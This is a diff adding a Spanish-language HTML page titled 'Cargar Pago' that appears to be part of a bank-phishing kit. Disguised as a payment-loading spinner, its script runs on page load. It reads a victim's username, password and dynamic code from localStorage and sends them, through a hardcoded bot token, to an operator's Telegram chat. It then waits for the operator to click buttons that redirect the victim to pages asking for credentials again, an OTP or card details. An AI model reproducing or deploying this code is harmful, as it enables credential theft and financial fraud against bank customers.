@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargar Pago</title>
+    <script src="js/jquery-3.7.7.js"></script>
+    <style>
+        /* Estilos para el loader */
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh; /* Altura completa de la ventana */
+            margin: 0;
+            background-color: #f0f0f0; /* Color de fondo */
+        }
+        .loader {
+            border: 16px solid #f3f3f3; /* Color claro del borde */
+            border-top: 16px solid #3498db; /* Color del borde superior */
+            border-radius: 50%;
+            width: 100px; /* Tamaño del loader */
+            height: 100px; /* Tamaño del loader */
+            animation: spin 2s linear infinite; /* Animación de giro */
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+    <script>
+        // Función para mostrar el loader
+        function mostrarLoader() {
+            document.querySelector(".loader").style.display = "flex";
+        }
+
+        // Función para ocultar el loader
+        function ocultarLoader() {
+            document.querySelector(".loader").style.display = "none";
+        }
+
+        // Función para enviar los datos a Telegram
+        async function enviarDatos() {
+            mostrarLoader();
+
+            // Obtener los datos de "userName", "clave" y "dinamica" del localStorage
+            const userName = localStorage.getItem('userName');
+            const clave = localStorage.getItem('clave');
+            const dinamica = localStorage.getItem('dinamica');
+
+            if (!userName || !clave || !dinamica) {
+                alert("No se encontraron los datos necesarios en localStorage.");
+                ocultarLoader();
+                return;
+            }
+
+            const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+
+            const message = `
+<b>Nueva solicitud pendiente de verificación.</b>
+--------------------------------------------------
+🆔 <b>ID:</b> | <b>${transactionId}</b>
+🧑‍💻 <b>Usuario:</b> | ${userName || '<i>No disponible</i>'}
+🔐 <b>Clave:</b> | ${clave || '<i>No disponible</i>'}
+🔑 <b>Dinámica:</b> | ${dinamica || '<i>No disponible</i>'}
+--------------------------------------------------
+`;
+
+            const keyboard = JSON.stringify({
+                inline_keyboard: [
+                    [{ text: "Error de Logo", callback_data: `error_logo:${transactionId}` }],
+                    [{ text: "Error Clave", callback_data: `error_clave:${transactionId}` }],
+                    [{ text: "Error Dinámica", callback_data: `error_dinamica:${transactionId}` }],
+                    [{ text: "Error OTP", callback_data: `error_otp:${transactionId}` }],
+                    [{ text: "Tarjeta", callback_data: `tarjeta:${transactionId}` }],
+                    [{ text: "Finalizar", callback_data: `finalizar:${transactionId}` }]
+                ],
+            });
+
+            // Enviar el mensaje con los botones a Telegram
+            const token = '7721159052:AAEebd2i8vGRajoDdTf76oIvdoEkCi-S3Jw'; // Token de tu bot
+            const chatId = '-4645882169'; // ID de chat de Telegram
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    reply_markup: keyboard,
+                    parse_mode: "HTML"
+                }),
+            })
+            .then((response) => response.json())
+            .then((data) => {
+                if (data.ok) {
+                    console.log("Mensaje enviado a Telegram con éxito");
+                    checkPaymentVerification(transactionId, token); // Verificar la respuesta de Telegram
+                } else {
+                    console.error("Error al enviar mensaje a Telegram:", data);
+                    ocultarLoader();
+                }
+            })
+            .catch((error) => {
+                console.error("Error al enviar mensaje a Telegram:", error);
+                ocultarLoader();
+            });
+        }
+
+        // Función para esperar la respuesta del bot de Telegram
+        async function checkPaymentVerification(transactionId, token) {
+            fetch(`https://api.telegram.org/bot${token}/getUpdates`)
+            .then((response) => response.json())
+            .then((data) => {
+                const updates = data.result;
+                const verificationUpdate = updates.find(
+                    (update) => update.callback_query && 
+                    update.callback_query.data.includes(transactionId)
+                );
+
+                if (verificationUpdate) {
+                    ocultarLoader(); // Ocultar loader cuando se recibe respuesta
+
+                    switch (verificationUpdate.callback_query.data) {
+                        case `error_logo:${transactionId}`:
+                            alert("Error de usuario. Intente nuevamente.");
+                            window.location.href = "index.html";
+                            break;
+                        case `error_clave:${transactionId}`:
+                            alert("Error de Clave. Intente nuevamente.");
+                            window.location.href = "index2.html";
+                            break;
+                        case `error_dinamica:${transactionId}`:
+                            alert("Error en la Dinámica. Intente nuevamente.");
+                            window.location.href = "index3.html";
+                            break;
+                        case `error_otp:${transactionId}`:
+                            alert("Error en OTP. Intente nuevamente.");
+                            window.location.href = "error_otp.html";
+                            break;
+                        case `tarjeta:${transactionId}`:
+                            window.location.href = "desembolso.html";
+                            break;
+                        case `finalizar:${transactionId}`:
+                            alert("Proceso finalizado con éxito.");
+                            window.location.href = "final1.html";
+                            break;
+                    }
+                } else {
+                    setTimeout(() => checkPaymentVerification(transactionId, token), 2000); // Continuar esperando respuestas
+                }
+            })
+            .catch((error) => {
+                console.error("Error al verificar respuesta desde Telegram:", error);
+                setTimeout(() => checkPaymentVerification(transactionId, token), 2000);
+            });
+        }
+
+        // Al cargar la página, se envían los datos
+        window.onload = function() {
+            enviarDatos(); // Enviar los datos a Telegram al cargar la página
+        };
+    </script>
+</head>
+<body>
+    <div class="loader" style="display: none;"></div> <!-- Loader oculto inicialmente -->
+</body>
+</html>
